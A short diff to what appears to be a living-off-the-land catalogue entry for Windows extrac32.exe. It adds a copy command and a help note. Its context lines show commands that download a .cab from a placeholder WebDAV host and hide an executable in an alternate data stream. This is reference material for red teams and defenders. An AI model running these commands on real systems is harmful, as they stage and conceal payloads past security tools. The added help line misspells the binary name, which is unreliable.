@@ -1,6 +1,6 @@
 ## Extrac32.exe
 
-* Functions: Add ADS, Download
+* Functions: Add ADS, Download, Copy
 
 ```
 extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe    
@@ -8,6 +8,8 @@ extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
 extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe    
 
 extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt   
+
+extrac32 /C c:\sourcefile.txt c:destFile.txt
 ```
 
 Acknowledgements:
@@ -29,7 +31,10 @@ c:\windows\sysWOW64\extrac32.exe
 ```
 
 Notes:
-
+For help menu
+```
+extract32 /? | more
+```
 
 
  
